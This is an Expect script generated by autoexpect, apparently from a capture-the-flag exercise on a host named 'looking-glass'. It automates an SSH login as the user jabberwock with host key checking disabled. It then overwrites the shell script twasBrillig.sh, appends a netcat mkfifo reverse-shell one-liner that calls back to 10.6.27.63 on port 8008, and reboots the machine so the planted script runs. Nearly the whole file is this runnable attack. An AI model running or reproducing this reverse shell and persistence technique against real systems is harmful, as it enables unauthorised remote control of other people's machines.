#!/usr/bin/expect -f
#
# This Expect script was generated by autoexpect on Tue Feb  9 21:40:23 2021
# Expect and autoexpect were both written by Don Libes, NIST.
#
# Note that autoexpect does not guarantee a working script.  It
# necessarily has to guess about certain things.  Two reasons a script
# might fail are:
#
# 1) timing - A surprising number of programs (rn, ksh, zsh, telnet,
# etc.) and devices discard or ignore keystrokes that arrive "too
# quickly" after prompts.  If you find your new script hanging up at
# one spot, try adding a short sleep just before the previous send.
# Setting "force_conservative" to 1 (see below) makes Expect do this
# automatically - pausing briefly before sending each character.  This
# pacifies every program I know of.  The -c flag makes the script do
# this in the first place.  The -C flag allows you to define a
# character to toggle this mode off and on.

set force_conservative 0  ;# set to 1 to force conservative mode even if
			  ;# script wasn't run conservatively originally
if {$force_conservative} {
	set send_slow {1 .1}
	proc send {ignore arg} {
		sleep .1
		exp_send -s -- $arg
	}
}

#
# 2) differing output - Some programs produce different output each time
# they run.  The "date" command is an obvious example.  Another is
# ftp, if it produces throughput statistics at the end of a file
# transfer.  If this causes a problem, delete these patterns or replace
# them with wildcards.  An alternative is to use the -p flag (for
# "prompt") which makes Expect only look for the last line of output
# (i.e., the prompt).  The -P flag allows you to define a character to
# toggle this mode off and on.
#
# Read the man page for more info.
#
# -Don


set timeout -1
set TARGET [lindex $argv 0]
set LOCAL [lindex $argv 1]
set PASSWORD [lindex $argv 2]

spawn ssh -o StrictHostKeyChecking=no jabberwock@$TARGET
match_max 100000

expect -exact "Warning: Permanently added '10.10.60.50' (ECDSA) to the list of known hosts.\r\r
\rjabberwock@10.10.60.50's password: "
send -- "$PASSWORD\r"
expect -exact "\r
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1\r\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "cp twasBrillig.sh twasBrillig.bak"
expect -exact "cp twasBrillig.sh twasBril"
expect -exact "l"
send -- "ig.bak\r"
expect -exact "ig.bak\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "ech"
expect -exact "c"
send -- "o"
expect -exact "ho"
send -- " \"#!/bin/ba"
expect -exact "ba"
send -- "sh\" > twasbrilli"
expect -exact "\[K"
send -- ""
expect -exact "\[K"
send -- ""
expect -exact "\[K\[K"
send -- ""
expect -exact "\[K"
send -- ""
expect -exact "\[K"
send -- "Bri"
expect -exact "ri"
send -- "llig.sh\r"
expect -exact "llig.sh\r
-bash: !/bin/bash: event not found\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "\[A"
expect -exact "cp twasBrillig.sh twasBrillig.bak"
send -- "\[B"
expect -exact "\r\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[C\[K"
send -- "ech"
expect -exact "ch"
send -- "o '#!/bin/bash1 > twasBrill"
expect -exact "o '#!/bin/bash1 > twasBril"
expect -exact "l"
send -- "ig.sh"
expect -exact "sh"
send -- "\r"
expect -exact "\r
> "
send -- ""
expect -exact "^C\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "ech"
expect -exact "ch"
send -- "o '#!/bin/bash1"
expect -exact "\[K"
send -- "' > "
expect -exact "> "
send -- "twasBri"
expect -exact "ri"
send -- "llig.sh\r"
expect -exact "llig.sh\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "ech"
expect -exact "c"
send -- "o"
expect -exact "ho"
send -- " 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.27.63 8008 >/tmp/f"
expect -exact "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\r2>&1|nc 10.6.27.63 8008 >/tmp/f"
send -- "' >> twasBrillig.sh\r"
expect -exact "' >> twasBrillig.sh\r
\]0;jabberwock@looking-glass: ~\[01;32mjabberwock@looking-glass\[00m:\[01;34m~\[00m\$ "
send -- "sudo "
expect -exact "o "
send -- "re"
expect -exact "re"
send -- "boot\r"
expect eof
